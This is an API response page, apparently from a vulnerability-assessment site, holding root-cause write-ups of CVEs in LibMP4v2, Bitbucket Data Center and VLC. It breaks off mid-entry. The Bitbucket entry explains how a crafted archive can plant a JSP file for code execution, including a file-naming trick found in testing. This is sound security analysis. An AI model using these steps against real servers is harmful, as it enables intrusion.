{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=2&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=0&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=1&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "b45d1e46-5e63-486e-862a-2c5248b53bdb",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "de62653a-b033-4270-a19a-9dba91cd4b79",
      "created": "2019-09-12T18:06:44.130879Z",
      "revisionDate": "2020-02-13T17:12:26.111442Z",
      "document": "# CVE-2018-14054: LibMP4v2 MP4StringProperty Handling Double Free Vulnerability\r\n\r\n## Introduction\r\n\r\nLibMP4v2 is an open source MP4 processing library, designed to create and modify MP4 files as defined by ISO-IEC:14496-1:2001 MPEG-4 Systems.\r\n\r\nOriginally discovered by Ruikai Liu, a double free vulnerability was found in the MP4StringProperty code. While parsing MP4 atoms, it is possible to cause a MP4StringProperty's value to be freed twice due to exception handling, resulting a double free condition. Since this is library code and not actively maintained, many third party applications seem to be affected by this without a fix.\r\n\r\n## Technical Analysis\r\n\r\nIn MP4 format, data units are called atoms, which contain information about the video file. One of those is called \"mp4v\", and this particular one is related to the vulnerability. To understand the problem, we want to learn how atoms are created and destroyed in code, and eventually the walk-through should reveal the double free condition.\r\n\r\n### Object Creation\r\n\r\nFirst off, atoms are parsed and read from an MP4 file. Our analysis begins with the following:\r\n\r\n```cpp\r\n// Line 399 (mp4atom.cpp)\r\nvoid MP4Atom::ReadChildAtoms() {\r\n  // ... code ...\r\n  // Line 428\r\n  MP4Atom* pChildAtom = MP4Atom::ReadAtom(m_File, this);\r\n  // code\r\n}\r\n```\r\n\r\nIn `MP4Atom::ReadAtom`, an atom object is created:\r\n\r\n```cpp\r\n// Line 112 (mp4atom.cpp)\r\nMP4Atom* MP4Atom::ReadAtom(MP4File& file, MP4Atom* pParentAtom) {\r\n  MP4Atom* pAtom = CreateAtom(file, pParentAtom, type);\r\n  // ... code ...\r\n```\r\n\r\nThe actual atom object depends on the type specified in the media file. For example, if the type is \"mp4v\", then this function should return **MP4Mp4vAtom**.\r\n\r\nWhen the `MP4Mp4vAtom` object is being prepared, multiple properties are born in the process. One of those is the **compressorName** string property:\r\n\r\n```cpp\r\n// Line 46 (atom_mp4v.cpp)\r\nMP4StringProperty* pProp = new MP4StringProperty(*this, \"compressorName\");\r\npProp->SetFixedLength(32);\r\npProp->SetCountedFormat(true);\r\npProp->SetValue(\"\");\r\nAddProperty(pProp); /* 6 */\r\n```\r\n\r\nBasically what this does is setting the `compressName` property to a 32+1 byte allocation, which is tracked in an array named **m_values**. It also sets the default value to empty, and finally that property object is saved by calling `AddProperty`, which is for another array named **m_pProperties**:\r\n\r\n```cpp\r\n// Line 350 (mp4property.cpp)\r\nvoid MP4StringProperty::SetValue(const char* value, uint32_t index)\r\n{\r\n    if (m_readOnly) {\r\n        ostringstream msg;\r\n        msg << \"property \" << m_name << \"is read-only\";\r\n        throw new PlatformException(msg.str().c_str(), EACCES, __FILE__, __LINE__, __FUNCTION__ );\r\n    }\r\n\r\n    MP4Free(m_values[index]);\r\n\r\n    if (m_fixedLength) {\r\n        m_values[index] = (char*)MP4Calloc(m_fixedLength + 1);\r\n        if (value) {\r\n            strncpy(m_values[index], value, m_fixedLength);\r\n        }\r\n    } else {\r\n        if (value) {\r\n            m_values[index] = MP4Stralloc(value);\r\n        } else {\r\n            m_values[index] = NULL;\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### Objection Destruction\r\n\r\nThe `MP4StringProperty` class has a destructor that empties all the heap allocations in `m_values`:\r\n\r\n```cpp\r\n// Line 331 (mp4property.cpp)\r\nMP4StringProperty::~MP4StringProperty()\r\n{\r\n    uint32_t count = GetCount();\r\n    for (uint32_t i = 0; i < count; i++) {\r\n        MP4Free(m_values[i]);\r\n    }\r\n}\r\n```\r\n\r\nIn order to trigger that destructor, one way is to destroy the atom object, which triggers its own destructor that clears the property array:\r\n\r\n```cpp\r\n// Line 61 (mp4atom.cpp)\r\nMP4Atom::~MP4Atom()\r\n{\r\n    uint32_t i;\r\n\r\n    for (i = 0; i < m_pProperties.Size(); i++) {\r\n        delete m_pProperties[i];\r\n    }\r\n\r\n    // ... destroying other things ...\r\n}\r\n```\r\n\r\nOK, so `MP4Atom::~MP4Atom` triggers `MP4BytesProperty::~MP4StringProperty`. Got it. And this is where things go wrong.\r\n\r\n### The First Free\r\n\r\nLet's rewind a bit and examine the `MP4Atom::ReadAtom` function again (line 112 in mp4atom.cpp). After an atom is created, it also performs a read operation toward the end of the function:\r\n\r\n```cpp\r\n// Line 193 (mp4atom.cpp)\r\ntry {\r\n  pAtom->Read();\r\n}\r\ncatch (Exception* x) {\r\n  // delete atom and rethrow so we don't leak memory.\r\n  delete pAtom;\t\r\n  throw x;\r\n}\r\n```\r\n\r\nThe Read is a virtual function, so many atom oriented classes may implement their own. If this isn't overloaded, then the generic version is also available. In this generic function, we just want to focus on how it loads properties:\r\n\r\n```cpp\r\n// Line 222 (mp4atom.cpp)\r\nvoid MP4Atom::Read()\r\n{\r\n    // ... code ...\r\n    ReadProperties();\r\n\t\t// ... code ...\r\n}\r\n```\r\n\r\nThe ReadProperties basically does this in a loop:\r\n\r\n```cpp\r\n// Line 376 (MP4Atom::ReadProperties in mp4atom.cpp)\r\nm_pProperties[i]->Read(m_File);\r\n```\r\n\r\nAs you remember, one of the properties is **compressorName**, which is a type of `MP4StringProperty`. In this context, we are looking at this Read function:\r\n\r\n```cpp\r\n// Line 374 (mp4property.cpp)\r\nvoid MP4StringProperty::Read( MP4File& file, uint32_t index )\r\n{\r\n   // ... code ...\r\n\r\n    for( uint32_t i = begin; i < max; i++ ) {\r\n        char*& value = m_values[i];\r\n        MP4Free(value); \r\n        if( m_useCountedFormat ) {\r\n            value = file.ReadCountedString( (m_useUnicode ? 2 : 1), m_useExpandedCount, m_fixedLength );\r\n        }\r\n    // ... code ...\r\n    }\r\n}\r\n```\r\n\r\nNotice the MP4Free is our first free, which frees the string property value. We know we will go down to the **ReadCountedString** path, because the m_useCountedFormat flag was set by `SetCountedFormat` while creating the `compressorName` property (line 48 in atom_mp4v.cpp).\r\n\r\n### The Second Free\r\n\r\nThe problem with `ReadCountedString` is that it may throw exceptions, which causes the property reading operation to fail, forcing the atom object to be deleted. For example:\r\n\r\nLine 383 in MP4File::ReadCountedString (mp4file_io.cpp):\r\n\r\n```cpp\r\nif (ix > 25) throw new PlatformException(\"Counted string too long 25 * 255\",ERANGE, __FILE__, __LINE__, __FUNCTION__);\r\n```\r\n\r\nLine 81 in MP4File::ReadBytes, used by ReadCountedString (mp4file_io.cpp):\r\n\r\n```cpp\r\nif( m_memoryBufferPosition + bufsiz > m_memoryBufferSize ) throw new Exception( \"not enough bytes, reached end-of-memory\", __FILE__, __LINE__, __FUNCTION__ );\r\n```\r\n\r\nLine 93 in MP4File::ReadBytes (mp4file_io.cpp):\r\n\r\n```cpp\r\nif( file->read( buf, bufsiz, nin )) throw new PlatformException( \"read failed\", sys::getLastError(), __FILE__, __LINE__, __FUNCTION__ );\r\n```\r\n\r\nLine 95 in MP4File::ReadBytes (mp4file_io.cpp):\r\n\r\n```cpp\r\nif( nin != bufsiz ) throw new Exception( \"not enough bytes, reached end-of-file\", __FILE__, __LINE__, __FUNCTION__ );\r\n```\r\n\r\nWhatever the exception is, it is handled way back in MP4Atom::ReadAtom, specifically here:\r\n\r\n```cpp\r\n// Line 193 (mp4atom.cpp)\r\ntry {\r\n  pAtom->Read();\r\n}\r\ncatch (Exception* x) {\r\n  // delete atom and rethrow so we don't leak memory.\r\n  delete pAtom;\t\r\n  throw x;\r\n}\r\n```\r\n\r\nNotice the `delete` operator, which is our second free. Again, if an atom is deleted, the `MP4Atom::~MP4Atom` destructor is called to clear the properties, and that causes `MP4StringProperty::~MP4StringProperty` to be called as part of the chain of reaction, resulting the `m_values` getting cleared.\r\n\r\n### Summary\r\n\r\nIn short, the MP4StringProperty handling is doomed here:\r\n\r\n```cpp\r\nvoid MP4StringProperty::Read( MP4File& file, uint32_t index ) {\r\n  // ... code ...\r\n\r\n  // Line 392 (mp4property.cpp)\r\n  MP4Free(value); \r\n  if( m_useCountedFormat ) {\r\n    value = file.ReadCountedString( (m_useUnicode ? 2 : 1), m_useExpandedCount, m_fixedLength );\r\n\r\n\t// ... code ...\r\n}\r\n```\r\n\r\nThe `MP4StringProperty::Read` function wants to update the string property, but never gets a replacement. Instead, it could get an exception, and causing the second free.\r\n\r\nThere are multiple ways to fix this. The easier way is by setting the value to NULL after the first free, so the string reading operation could continue successfully even with the second free. The other way is probably redo the exception handling a bit more strategically.\r\n\r\n",
      "score": 5,
      "metadata": {},
      "tags": []
    },
    {
      "id": "ecd1c7b9-8c5d-4ad3-821b-5615094bc454",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "1c04af80-21d4-49ee-9a16-921297dd3e60",
      "created": "2019-09-12T18:06:44.781021Z",
      "revisionDate": "2020-09-14T10:46:22.257361Z",
      "document": "This exploit is difficult to judge.  Some exploitation scores for this vulnerability have been very high, and I understand why: This is a vulnerability on a typically externally facing, or universally-internally-facing service, but the service is optional.  While certainly this is a priority to patch and mitigate, I find it hard to understand why a vulnerability on an optional service ranks as a 10/10 on vulnerability scores.  That conclusion may be based on my ignorance of deployed Cisco products.\r\nEdit",
      "score": 7,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "95ce4aca-47c6-4518-8ce8-ec1f353ba749",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "081c8769-2c70-49c4-b371-acdebc3b400a",
      "created": "2019-09-12T18:06:45.563206Z",
      "revisionDate": "2020-02-13T17:12:25.622441Z",
      "document": "## CVE-2019-3397: Atlassian BitBucket Data Center Migration Tool Directory Traversal Vulnerability\r\n\r\n### Introduction\r\n\r\nBitbucket Data Center is the on-premises Git repository management solution for larger enterprises that require high availability and performance at scale. It uses a cluster of Bitbucket server nodes and is designed in your own data center.\r\n\r\nA vulnerability was found in the Data Center's migration tool. If a maliciously crafted archive is placed on the Bitbucket server, a remote user with administrative permissions could import it for data migration, allowing extracted files to be written to arbitrary locations, and result in remote code execution. \r\n\r\nPlease note that this vulnerability is treated as local (a file format bug) and not remote, this is because Bitbucket does not allow archives to be uploaded remotely. More details below.\r\n\r\nAffected versions:\r\n\r\n- 5.13.0 <= version < 5.13.6\r\n- 5.14.0 <= version < 5.14.4\r\n- 5.15.0 <= version < 5.15.3\r\n- 5.16.0 <= version < 5.16.3\r\n- 6.0.0 <= version < 6.0.3\r\n- 6.1.0 <= version 6.1.2\r\n\r\n### Technical Analysis\r\n\r\nOriginally, the vulnerability research was influenced by another more generic research effort codenamed [Zip Slip](https://snyk.io/research/zip-slip-vulnerability), conducted by the Snyk security team in 2018. The Zip Skip research basically concluded that archive extraction could be dangerous due to potential arbitrary file overwrite, and security is often overlooked by many applications. Based on Zip Slip, RIPS' Code Analysis engine managed to find a similar issue with Bitbucket's migration tool, which later recognized as CVE-2019-3397.\r\n\r\n#### REST API for Archive Import\r\n\r\nKnowing that backstory, we are specifically looking for any Java code or API documentation associated with things such as archive processing (patricianly extraction), data importing, etc, in Bitbucket. According to the [Data Center Migration documentation](https://confluence.atlassian.com/bitbucketserver/importing-957497836.html), importing is a feature in the form REST API, and can be used this way with curl:\r\n\r\n```\r\ncurl -s -n -X POST -H 'Content-type: application/json' -d '{\"archivePath\":\"Bitbucket_export_422.tar\"}' http://localhost:7990/bitbucket/rest/api/1.0/migration/imports | jq .\r\n```\r\n\r\nThe documentation is also very clear that the tar file would be imported to the following path:\r\n\r\n```\r\n$BITBUCKET_HOME/shared/data/migration/import\r\n```\r\n\r\nIn my installation, this is actually:\r\n\r\n```\r\n/var/atlassian/application-data/bitbucket/shared/data/migration/import\r\n```\r\n\r\nSince the feature is part of REST, we can quickly do a search and find these:\r\n\r\n```\r\n$ find . -name *rest*.jar\r\n./app/WEB-INF/lib/crowd-integration-client-rest-3.3.3-platform5-jdk11-m02.jar\r\n./app/WEB-INF/atlassian-bundled-plugins/bitbucket-rest-ui-6.1.0.jar\r\n./app/WEB-INF/atlassian-bundled-plugins/bitbucket-git-rest-6.1.0.jar\r\n./app/WEB-INF/atlassian-bundled-plugins/atlassian-rest-module-6.0.0.jar\r\n./app/WEB-INF/atlassian-bundled-plugins/bitbucket-rest-6.1.0.jar\r\n./app/WEB-INF/atlassian-bundled-plugins/bitbucket-ref-restriction-6.1.0.jar\r\n./app/WEB-INF/atlassian-bundled-plugins/atlassian-plugins-webresource-rest-4.0.3.jar\r\n./elasticsearch/modules/reindex/elasticsearch-rest-client-6.5.3.jar\r\n```\r\n\r\nThe file `bitbucket-rest-6.1.0.jar` seems to be more of a direct match, so that's where we start. By decompiling the file and searching for the `archivePath` string, we found this Java constructor:\r\n\r\n```java\r\n@JsonSerialize\r\npublic class RestImportRequest extends RestMapEntity {\r\n  // ... some code here ...\r\n\r\n  public RestImportRequest(String archivePath) {\r\n    put(\"archivePath\", archivePath);\r\n  }\r\n  \r\n  // ... more code here ...\r\n}\r\n```\r\n\r\nFinding that indicates that we're looking at the right JAR file. Looking a bit further, we also found this code:\r\n\r\n```java\r\npublic class MigrationResource extends RestResource {\r\n  // ... some code ...\r\n  @POST\r\n  @Path(\"/imports\")\r\n  public Response startImport(RestImportRequest request) {\r\n    ValidationUtils.validate(this.validator, request, new Class[0]);\r\n\r\n    Job exportJob = this.migrationService.startImport(toImportRequest(request));\r\n\r\n    return ResponseFactory.ok(new RestJob(exportJob)).build();\r\n  }\r\n\r\n  // ... more code ...\r\n```\r\n\r\nThe block of code is for handling the `/imports` path, and notice:\r\n\r\n```java\r\nthis.migrationService.startImport\r\n```\r\n\r\n`this.migrationService` is defined as below, which tells us we should be looking at the `migrationService` instance:\r\n\r\n```java\r\nprivate final MigrationService migrationService;\r\n```\r\n\r\nThe MigrationService interface can be found in the bitbucket-api-6.1.0.jar file, but the actual implementation is found in bitbucket-service-impl-6.1.0.jar. In the second file, the `startImport` function is declared like the following, which indicates that not only the vulnerability requires authentication, it requires admin access:\r\n\r\n```java\r\n@Nonnull\r\n@PreAuthorize(\"hasGlobalPermission('ADMIN')\")\r\npublic Job startImport(@Nonnull ImportRequest request)\r\n```\r\n\r\nAbout half way of `startImport` is where the import process begins, and this block of code is particularly interesting to us:\r\n\r\n```java\r\n// ... some code ...\r\ntry(FileChannel channel = FileChannel.open(importPath, new OpenOption[] { StandardOpenOption.READ });\r\n    InputStream inputStream = Channels.newInputStream(channel); \r\n    TarArchiveSource source = new TarArchiveSource(inputStream, importPath)) {\r\n  \t\tcontext = new DefaultImportContext(source, this.i18nService, importJob, getPercentageSupplier(channel.size(), channel), this.userImportService);\r\n  \t\tthis.activeImports.put(Long.valueOf(importJob.getId()), context);\r\n  \t\ttry {\r\n    \t\tthis.importService.importRepositories(context);\r\n// ... more code ...\r\n```\r\n\r\nIn the above code, first we can see that there is a file \"channel\" is created to load up the input stream for an archive instance. This instance is created to set up for DefaultImportContext, and then this context goes to a function called **importRepositories** (from the ImportService class).\r\n\r\nIn the `importRepositories` function, we see the beginning of tar extraction:\r\n\r\n```java\r\ncontext.iterateEntries(entrySource -> {\r\n  Path path = entrySource.getPath();\r\n\r\n  Path namespace = path.getName(0);\r\n  Path relativePath = namespace.relativize(path);\r\n  if (MigrationPaths.INTERNAL_PREFIX.equals(namespace)) {\r\n    handleInternalPath(context, importerMapping, relativePath);\r\n  } else {\r\n    handleImporterPath(context, importerMapping, relativePath, entrySource, namespace);\r\n  } \r\n});\r\n```\r\n\r\nExactly how the entry is handled depends on this condition:\r\n\r\n```java\r\nMigrationPaths.INTERNAL_PREFIX.equals(namespace)\r\n```\r\n\r\nHowever, for the most part, it looks like we will most likely hit this function call:\r\n\r\n```java\r\nhandleImporterPath(context, importerMapping, relativePath, entrySource, namespace);\r\n```\r\n\r\nThe most important part of `handleImporterPath` is this:\r\n\r\n```java\r\npublic class DefaultImportService extends AbstractService implements ImportService {\r\n  // ... code ...\r\n  private void handleImporterPath(InternalImportContext context, Map<Path, ErrorHandlingDataImporter> importerMapping, Path relativePath, EntrySource entrySource, Path namespace) throws IOException {\r\n    // ... code ...\r\n    if (tarArchive.matches(localPath)) {\r\n\r\n      String name = localPath.getFileName().toString();\r\n      name = name.substring(0, name.length() - \".atl.tar\".length());\r\n      localPath = localPath.resolveSibling(name);\r\n\r\n      importer.importArchiveEntry(new TarArchiveSource(inputStream, localPath));\r\n    } else {\r\n      importer.importEntry(new DefaultEntrySource(inputStream, localPath));\r\n    } \r\n    // ... code ...\r\n```\r\n\r\nAlthough there is a condition to determine whether the function should call `importArchiveEntry` or `importEntry`, it isn't a huge deal, because they both rely on a callback function called `onArchiveEntry`, so they are kind of similar. For example, this is `importArchiveEntry`:\r\n\r\n```java\r\nvoid importArchiveEntry(ArchiveSource archiveSource) {\r\n  try {\r\n    this.delegate.onArchiveEntry(this.context, archiveSource);\r\n  } catch (Exception e) {\r\n    addCallbackErrorFor(e, \"onArchiveEntry\", new Object[0]);\r\n    if (e instanceof FatalImportException) {\r\n      throw e;\r\n    }\r\n  } \r\n}\r\n```\r\n\r\n#### Archive Extraction\r\n\r\nThe `onArchiveEntry` callback comes from the `RepositoryAttachmentsImporter` class. There is a lot of code in this function, but the most interesting portion is this:\r\n\r\n```java\r\npublic void onArchiveEntry(@Nonnull ImportContext importContext, @Nonnull ArchiveSource archiveSource) {\r\n  // ... code ...\r\n  Path target = this.storageService.getAttachmentsDir(repo);\r\n  try {\r\n    Files.createDirectories(target, new java.nio.file.attribute.FileAttribute[0]);\r\n  // ... code ...\r\n\tarchiveSource.extractToDisk(target);\r\n  // ... code ...\r\n```\r\n\r\nThe `extractToDisk` function above comes from TarEntrySource, where `the extractToDisk` call  below is most important:\r\n\r\n```java\r\nprivate static class TarEntrySource extends DefaultEntrySource {\r\n  // ... code ...\r\n  public void extractToDisk(@Nonnull Path target) throws IOException {\r\n    super.extractToDisk(target);\r\n    // ... code ...\r\n}\r\n```\r\n\r\nAs you can see, most of the `extractToDisk` is implemented in the parent class, which is DefaultEntrySource. If we look at that, clearly this is the code responsible for writing our file to disk:\r\n\r\n```java\r\npublic class DefaultEntrySource implements EntrySource {\r\n  // ... code ...\r\n\r\n   public void extractToDisk(@Nonnull Path target) throws IOException {\r\n    Objects.requireNonNull(target, \"target\");\r\n    \r\n    guardAgainstRepeatedCalls();\r\n    Files.createDirectories(target.getParent(), new java.nio.file.attribute.FileAttribute[0]);\r\n    try (OutputStream out = new FileOutputStream(target.toFile())) {\r\n      IoUtils.copy(this.inputStream, out, 32768);\r\n    } \r\n  }\r\n}\r\n```\r\n\r\n#### Possible Remote Code Execution\r\n\r\n##### 1st Requirement: Ability to Upload\r\n\r\nTypically, an archive extraction bug on a web application is likely a remote type vulnerability, but it does not seem to be the case for Bitbucket, because there is no legit way to upload your TAR file to it.\r\n\r\nOne possible way I have found is that Bitbucket allows you to create a new storage path on the admin interface, and if you could somehow mount a share, you could make it load the malicious archive remotely, and trigger the extraction. However, in automated exploitation, this is probably unpractical since mounting implies code execution already.\r\n\r\nAs an attacker, you would need to figure out how to get the malicious archive to the server, and that is beyond the scope of the CVE.\r\n\r\n##### 2nd Requirement: Payload Placement\r\n\r\nThe second requirement to get code execution is the archive needs to embed a JSP payload that is expected to be written to a location that a GET request could reach. Since the archive has direct control of FileOutputStream, this seems possible at first glance, but this is where things get a little bit more interesting.\r\n\r\nWe know that Bitbucket is based on Apache Tomcat, so the Jasper component would be handling JSP files. In theory, we should be able to place a JSP file in the following directory, and make the server load it:\r\n\r\n```\r\n/opt/atlassian/bitbucket/6.1.0/app\r\n```\r\n\r\nAlso, if a JSP file is loaded, the \"cached\" version should be found in:\r\n\r\n```\r\n/var/atlassian/application-data/bitbucket/tmp/tomcat.5664249735078236529.7990/work/Tomcat/localhost/ROOT/org/apache/jsp/\r\n```\r\n\r\nHowever, what actually happens is if you just write a file, BitBucket doesn't seem to want to load it at all, and you will just get a 404 Not-Found when you call it.\r\n\r\nFor this to work, the secret is that you want to name your JSP file to start with \"test\". As an experiment, in the app folder, save your JSP file like this:\r\n\r\n```\r\necho Hello World > test01.jsp\r\n```\r\n\r\nAnd then request it with curl, you should get:\r\n\r\n```\r\n$ curl -v http://172.16.135.158:7990/test01.jsp\r\n*   Trying 172.16.135.158...\r\n* TCP_NODELAY set\r\n* Connected to 172.16.135.158 (172.16.135.158) port 7990 (#0)\r\n> GET /test01.jsp HTTP/1.1\r\n> Host: 172.16.135.158:7990\r\n> User-Agent: curl/7.54.0\r\n> Accept: */*\r\n> \r\n< HTTP/1.1 200 \r\n< X-AREQUESTID: @L2C5R0x973x867x0\r\n< X-ASEN: SEN-L14114184\r\n< x-xss-protection: 1; mode=block\r\n< x-frame-options: SAMEORIGIN\r\n< x-content-type-options: nosniff\r\n< Set-Cookie: BITBUCKETSESSIONID=E1E422B7BCAE9A96C452C629623207E7; Path=/; HttpOnly\r\n< vary: accept-encoding\r\n< Content-Type: text/html\r\n< Transfer-Encoding: chunked\r\n< Date: Wed, 28 Aug 2019 21:13:36 GMT\r\n< \r\nHello World\r\n```\r\n\r\nDouble check in the cache folder, you should find your JSP file as:\r\n\r\n```\r\ntest01_jsp.class\r\ntest01_jsp.java\r\n```\r\n\r\nLooking around the web, it doesn't look like this is the [desired behavior](https://community.atlassian.com/t5/Bitbucket-questions/Serve-static-file-with-bitbucket/qaq-p/758687). In fact, while poking at BitBucket, it doesn't even look like there's any documentation on how to modify [Jasper configuration](http://tomcat.apache.org/tomcat-6.0-doc/jasper-howto.html), so likely this is a bug.\r\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f9cd1848-c305-442c-b15a-aa1085ec45a5",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "8e2c32da-73bf-4774-8c78-704e045f2412",
      "created": "2019-09-12T18:06:46.279592Z",
      "revisionDate": "2020-02-13T17:12:25.338263Z",
      "document": "## CVE-2019-12874 VLC zlib_decompress_extra Double Free Vulnerability\r\n\r\nVLC media player is a free and open-source portable cross-platform media player software developed by the VideoLAN project. VLC is available for desktop operating systems and mobile platforms, such as Android, iOS, iPadOS, Wizen, Windows 10 Mobile, and Windows Phone. It is also available on digital distribution platforms such as Apple's App Store, Google Play, and Microsoft Store. It supports many audio and video compression methods and file formats, and can be used to stream media over computer networks.\r\n\r\nA vulnerability was found in VLC's `lib_decompress_extra` function, where the `p_track` parameter is freed and later deleted, which results a double free condition.\r\n\r\n## Technical Details\r\n\r\nThe `lib_decompress_extra` function can be found in modules/demux/mkv/util.cpp:\r\n\r\n```c\r\nint32_t zlib_decompress_extra( demux_t * p_demux, mkv_track_t & tk )\r\n{\r\n    int result;\r\n    z_stream d_stream;\r\n    size_t n = 0;\r\n    uint8_t * p_new_extra = NULL;\r\n\r\n    msg_Dbg(p_demux,\"Inflating private data\");\r\n\r\n    d_stream.zalloc = Z_NULL;\r\n    d_stream.zfree = Z_NULL;\r\n    d_stream.opaque = Z_NULL;\r\n    if( inflateInit( &d_stream ) != Z_OK )\r\n    {\r\n        msg_Err( p_demux, \"Couldn't initiate inflation ignore track %u\",\r\n                 tk.i_number );\r\n        return 1;\r\n    }\r\n\r\n    d_stream.next_in = tk.p_extra_data;\r\n    d_stream.avail_in = tk.i_extra_data;\r\n    do\r\n    {\r\n        n++;\r\n        void *alloc = realloc(p_new_extra, n*1024);\r\n        if( alloc == NULL )\r\n        {\r\n            msg_Err( p_demux, \"Couldn't allocate buffer to inflate data, ignore track %u\",\r\n                      tk.i_number );\r\n            free(p_new_extra);\r\n            inflateEnd( &d_stream );\r\n            return 1;\r\n        }\r\n\r\n        p_new_extra = static_cast<uint8_t *>( alloc );\r\n        d_stream.next_out = &p_new_extra[(n - 1) * 1024];\r\n        d_stream.avail_out = 1024;\r\n        result = inflate(&d_stream, Z_NO_FLUSH);\r\n        if( result != Z_OK && result != Z_STREAM_END )\r\n        {\r\n            msg_Err( p_demux, \"Zlib decompression failed. Result: %d\", result );\r\n            inflateEnd( &d_stream );\r\n            free(p_new_extra);\r\n            return 1;\r\n        }\r\n    }\r\n    while ( d_stream.avail_out == 0 && d_stream.avail_in != 0  &&\r\n            result != Z_STREAM_END );\r\n\r\n    free( tk.p_extra_data );\r\n    tk.i_extra_data = d_stream.total_out;\r\n    p_new_extra = static_cast<uint8_t *>( realloc(p_new_extra, tk.i_extra_data) );\r\n    if( !p_new_extra )\r\n    {\r\n        msg_Err( p_demux, \"Couldn't allocate buffer to inflate data, ignore track %u\",\r\n                 tk.i_number );\r\n        inflateEnd( &d_stream );\r\n        return 1;\r\n    }\r\n\r\n    tk.p_extra_data = p_new_extra;\r\n\r\n    inflateEnd( &d_stream );\r\n    return 0;\r\n}\r\n```\r\n\r\nThe specific buggy block of code is narrowed down as follows:\r\n\r\n```c\r\n    free( tk.p_extra_data );\r\n    tk.i_extra_data = d_stream.total_out;\r\n    p_new_extra = static_cast<uint8_t *>( realloc(p_new_extra, tk.i_extra_data) );\r\n    if( !p_new_extra )\r\n    {\r\n        msg_Err( p_demux, \"Couldn't allocate buffer to inflate data, ignore track %u\",\r\n                 tk.i_number );\r\n        inflateEnd( &d_stream );\r\n        return 1;\r\n    }\r\n```\r\n\r\nAs you can see, `tk.p_extra_data` is freed:\r\n\r\n```c\r\nfree( tk.p_extra_data );\r\n```\r\n\r\nAnd then if for some reason, the static casting for `p_new_extra` fails, the function returns with 1. It is hard to say exactly how a realloc failure would occur, typically this is due to out of memory, so that means `tk.i_extra_data` would have to be something at least bigger than 0x7fffffff on a 32-bit VLC application.\r\n\r\nAfter the free, the `zlib_decompress_extra` function returns to a function called `matroska_segment_c::ParseTrackEntry` (found in modules/demux/mkv/matroska_segment_parse.cpp):\r\n\r\n```c\r\nvoid matroska_segment_c::ParseTrackEntry( const KaxTrackEntry *m )\r\n{\r\n  ...\r\n\tif( p_track->i_compression_type == MATROSKA_COMPRESSION_ZLIB &&\r\n            p_track->i_encoding_scope & MATROSKA_ENCODING_SCOPE_PRIVATE &&\r\n            p_track->i_extra_data && p_track->p_extra_data &&\r\n            zlib_decompress_extra( &sys.demuxer, *p_track ) )\r\n        {\r\n            msg_Err(&sys.demuxer, \"Couldn't handle the track %u compression\", p_track->i_number );\r\n            delete p_track;\r\n            return;\r\n        }\r\n  ...\r\n```\r\n\r\nSince the `zlib_decompress_extra` function returns 1 due to a failure from realloc, it is possible all those if conditions are true, which results the program printing an error message, and then the double free:\r\n\r\n```c\r\ndelete p_track;\r\n```\r\n\r\nDue to the failure requirement for realloc, an exploit is unlikely.\r\n\r\n## Patch Information\r\n\r\nIn the patch, `tk_p_extra_data` is set to a null pointer, which is safe for `delete`:\r\n\r\n```c\r\n         msg_Err( p_demux, \"Couldn't allocate buffer to inflate data, ignore track %u\",\r\n                  tk.i_number );\r\n         inflateEnd( &d_stream );\r\n+        tk.p_extra_data = NULL;\r\n         return 1;\r\n     }\r\n \r\n         return 1;\r\n```\r\n\r\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "41598abc-b988-4722-a3cd-f1223040da2a",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "4aa126b3-f93d-4e11-b00b-01eec76a98c1",
      "created": "2019-09-12T18:06:46.913387Z",
      "revisionDate": "2020-02-13T17:12:25.098424Z",
      "document": "## CVE-2019-13962 avcodec lavc_CopyPicture Heap Buffer Overflow\r\n\r\nVLC media player is a free and open-source portable cross-platform media player software developed by the VideoLAN project. VLC is available for desktop operating systems and mobile platforms, such as Android, iOS, iPadOS, Wizen, Windows 10 Mobile, and Windows Phone. It is also available on digital distribution platforms such as Apple's App Store, Google Play, and Microsoft Store. It supports many audio and video compression methods and file formats, and can be used to stream media over computer networks.\r\n\r\nA vulnerability was found in the AV codec's `Iavc_CopyPicture` function. A malicious video file can be crafted with an invalid width and height, and cause a heap based buffer overflow.\r\n\r\nVersions 3.0.7 and prior are vulnerable.\r\n\r\n## Technical Details\r\n\r\nIn the AV codec, when a video is being decoded, it is done frame by frame (or block). In each frame, the `lavc_CopyPicture` function is called (found in modules/codec/avcodec/video.c:1177)\r\n\r\n```c\r\n        picture_t *p_pic = frame->opaque;\r\n        if( p_pic == NULL )\r\n        {   /* When direct rendering is not used, get_format() and get_buffer()\r\n             * might not be called. The output video format must be set here\r\n             * then picture buffer can be allocated. */\r\n            if (p_sys->p_va == NULL\r\n             && lavc_UpdateVideoFormat(p_dec, p_context, p_context->pix_fmt,\r\n                                       p_context->pix_fmt) == 0)\r\n                p_pic = decoder_NewPicture(p_dec);\r\n\r\n            if( !p_pic )\r\n            {\r\n                av_frame_free(&frame);\r\n                break;\r\n            }\r\n\r\n            /* Fill picture_t from AVFrame */\r\n            if( lavc_CopyPicture( p_dec, p_pic, frame ) != VLC_SUCCESS )\r\n            {\r\n                av_frame_free(&frame);\r\n                picture_Release( p_pic );\r\n                break;\r\n            }\r\n        }\r\n```\r\n\r\nThe `lavc_CopyPicture` is meant for copying a picture from the libavcodec-allocate buffer to a picture_t. In this function, there is a check:\r\n\r\n```c\r\nstatic int lavc_CopyPicture(decoder_t *dec, picture_t *pic, AVFrame *frame)\r\n{\r\n...\r\nelse if (fourcc != pic->format.i_chroma\r\n     || frame->width > (int) pic->format.i_width\r\n     || frame->height > (int) pic->format.i_height) // 